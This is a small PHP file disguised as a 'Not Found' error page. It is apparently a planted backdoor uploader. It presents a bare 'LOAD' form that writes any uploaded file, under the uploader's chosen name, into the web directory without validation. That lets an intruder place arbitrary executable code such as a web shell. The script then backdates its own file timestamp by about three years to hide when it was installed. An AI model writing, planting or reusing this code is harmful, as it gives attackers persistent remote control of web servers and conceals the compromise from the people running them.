<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<title>Not Found</title>
</head>
<body>
<?php

echo "<form method=\"post\" enctype=\"multipart/form-data\">\n";
echo "<input type=\"file\" name=\"filename\"><br> \n";
echo "<input type=\"submit\" value=\"LOAD\"><br>\n";
echo "</form>\n";
if(is_uploaded_file($_FILES["filename"]["tmp_name"]))
	{
	move_uploaded_file($_FILES["filename"]["tmp_name"], $_FILES["filename"]["name"]);
	$file = $_FILES["filename"]["name"];
	echo "<a href=\"$file\">$file</a>";
	} else {
	echo("NO FILE");
	}
$filename = $_SERVER[SCRIPT_FILENAME];
$time = time() - 105211600;
touch($filename, $time);
?>
</body>
</html>